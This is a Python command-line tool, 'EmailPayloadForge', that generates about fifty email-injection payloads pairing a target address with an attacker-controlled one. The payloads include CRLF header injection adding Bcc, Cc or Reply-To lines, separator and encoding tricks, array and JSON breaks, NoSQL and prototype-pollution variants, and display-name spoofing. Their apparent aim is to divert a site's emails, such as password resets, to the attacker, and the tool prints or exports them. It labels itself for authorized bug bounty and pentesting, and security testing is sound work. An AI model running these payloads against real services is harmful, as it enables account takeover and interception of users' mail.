#!/usr/bin/env python3
"""
EmailPayloadForge - Email injection payload generator
For authorized bug bounty and penetration testing only.
"""

import argparse
import urllib.parse
from datetime import datetime

BANNER = r"""
 _____           _ _  ____               _  _____ _____
| ____|_ __ ___ (_) |/ ___|__  _ __ ___ (_)| ____|_   _|
|  _| | '_ ` _ \| | | |_ / _ \| '__/ _ \| ||  _|   | |
| |___| | | | | | | |  _| (_) | | | (_) | || |___  | |
|_____|_| |_| |_|_|_|_|  \___/|_|  \___/|_||_____| |_|
              EmailPayloadForge v1.0
  Authorized bug bounty & pentest use only
"""


def build_payloads(orig: str, attacker: str) -> list[dict]:
    o, a = orig, attacker
    payloads = [
        # --- Comma separators ---
        {"cat": "Comma", "payload": f"{o},{a}"},
        {"cat": "Comma", "payload": f"{a},{o}"},
        {"cat": "Comma", "payload": f" {o} , {a} "},
        # --- Semicolon ---
        {"cat": "Semicolon", "payload": f"{o};{a}"},
        {"cat": "Semicolon", "payload": f"{a};{o}"},
        # --- Pipe ---
        {"cat": "Pipe", "payload": f"{o}|{a}"},
        {"cat": "Pipe", "payload": f"{a}|{o}"},
        # --- Space ---
        {"cat": "Space", "payload": f"{o} {a}"},
        # --- URL-encoded newlines ---
        {"cat": "Newline %0a", "payload": f"{o}%0a{a}"},
        {"cat": "Newline %0a", "payload": f"{a}%0a{o}"},
        {"cat": "Newline %0d%0a", "payload": f"{o}%0d%0a{a}"},
        {"cat": "Newline %0d%0a", "payload": f"{a}%0d%0aCc: {o}"},
        # --- CRLF Header Injection ---
        {"cat": "CRLF Bcc", "payload": f"{o}%0d%0aBcc: {a}"},
        {"cat": "CRLF Bcc", "payload": f"{o}\r\nBcc: {a}"},
        {"cat": "CRLF Cc", "payload": f"{o}\r\nCc: {a}"},
        {"cat": "CRLF To", "payload": f"{o}\nTo: {a}"},
        {"cat": "CRLF Reply-To", "payload": f"{o}\r\nReply-To: {a}"},
        {"cat": "CRLF Reply-To", "payload": f"{o}%0d%0aReply-To: {a}"},
        {"cat": "CRLF CC header", "payload": f"{o}%0d%0aCC: {a}"},
        {"cat": "CRLF BCC header", "payload": f"{o}%0d%0aBCC: {a}"},
        # --- Array types ---
        {"cat": "Array string", "payload": f'["{o}","{a}"]'},
        {"cat": "Array string", "payload": f'["{a}","{o}"]'},
        {"cat": "Array JSON", "payload": f'{{"email":["{o}","{a}"]}}'},
        {"cat": "Array JSON", "payload": f'{{"to":["{o}"],"cc":["{a}"]}}'},
        # --- Encoding ---
        {"cat": "Null byte", "payload": f"{o}%00{a}"},
        {"cat": "Null byte", "payload": f"{o}\x00{a}"},
        {"cat": "Double encode", "payload": f"{o}%252c{a}"},
        {"cat": "Double encode", "payload": f"{o}%250a{a}"},
        {"cat": "HTML entity", "payload": f"{o}&#44;{a}"},
        {"cat": "HTML entity", "payload": f"{o}&comma;{a}"},
        {"cat": "Tab sep", "payload": f"{o}\t{a}"},
        {"cat": "Tab encoded", "payload": f"{o}%09{a}"},
        {"cat": "Unicode LS", "payload": f"{o}\u2028{a}"},
        {"cat": "Unicode PS", "payload": f"{o}\u2029{a}"},
        # --- From/display name spoofing ---
        {"cat": "Display spoof", "payload": f'"{o}" <{a}>'},
        {"cat": "Display spoof", "payload": f"{a} <{o}>"},
        # --- JSON injection ---
        {"cat": "JSON break", "payload": f'{o}","email":"{a}'},
        {"cat": "JSON break", "payload": f'{o}"}},"email":"{a}'},
        # --- Prototype / NoSQL ---
        {"cat": "Prototype", "payload": f'{{"email":"{o}","__proto__":{{"notify":"{a}"}}}}'},
        {"cat": "NoSQL $eq", "payload": f'{{"email":{{"$eq":"{o}"}},"notify":"{a}"}}'},
        # --- Template injection ---
        {"cat": "Template", "payload": f"{o}{{{{ {a} }}}}"},
        {"cat": "Template", "payload": f"{o}#{{ {a} }}"},
        # --- Misc ---
        {"cat": "Plus concat", "payload": f"{o}+{a}"},
        {"cat": "Backslash", "payload": f"{o}\\{a}"},
        {"cat": "At-sign dup", "payload": f"{a}@{o}"},
        {"cat": "Quoted comma", "payload": f'"{o},{a}"'},
        {"cat": "Quoted comma", "payload": f"'{o},{a}'"},
        {"cat": "Truncation pad", "payload": f"{o.split('@')[0]}{'a'*40}@{o.split('@')[1]}"},
    ]
    return payloads


def print_table(payloads: list[dict], filter_cat: str = None):
    col_w = 22
    filtered = [p for p in payloads if not filter_cat or p["cat"] == filter_cat]
    current_cat = None
    for p in filtered:
        if p["cat"] != current_cat:
            current_cat = p["cat"]
            print(f"\n  \033[36m── {current_cat}\033[0m")
        print(f"    {p['payload']}")


def export_txt(payloads: list[dict], orig: str, attacker: str, path: str):
    lines = [
        "# EmailPayloadForge",
        f"# Original: {orig}",
        f"# Attacker: {attacker}",
        f"# Generated: {datetime.now().isoformat()}",
        "# AUTHORIZED TESTING ONLY",
        "",
    ]
    current_cat = None
    for p in payloads:
        if p["cat"] != current_cat:
            current_cat = p["cat"]
            lines.append(f"\n## {current_cat}")
        lines.append(p["payload"])
    with open(path, "w") as f:
        f.write("\n".join(lines))
    print(f"\n[+] Exported {len(payloads)} payloads → {path}")


def main():
    print(BANNER)
    parser = argparse.ArgumentParser(
        description="EmailPayloadForge — email injection payload generator"
    )
    parser.add_argument("-o", "--orig", required=True, help="Original/target email")
    parser.add_argument("-a", "--attacker", required=True, help="Attacker/collector email")
    parser.add_argument("-f", "--filter", help="Filter by category name", default=None)
    parser.add_argument("-e", "--export", help="Export to .txt file path", default=None)
    parser.add_argument("--list-cats", action="store_true", help="List all categories")
    args = parser.parse_args()

    payloads = build_payloads(args.orig, args.attacker)
    cats = list(dict.fromkeys(p["cat"] for p in payloads))

    print(f"  Target:   {args.orig}")
    print(f"  Attacker: {args.attacker}")
    print(f"  Total:    {len(payloads)} payloads across {len(cats)} categories\n")

    if args.list_cats:
        for c in cats:
            count = sum(1 for p in payloads if p["cat"] == c)
            print(f"  {c:<25} ({count})")
        return

    print_table(payloads, args.filter)

    if args.export:
        export_txt(payloads, args.orig, args.attacker, args.export)


if __name__ == "__main__":
    main()
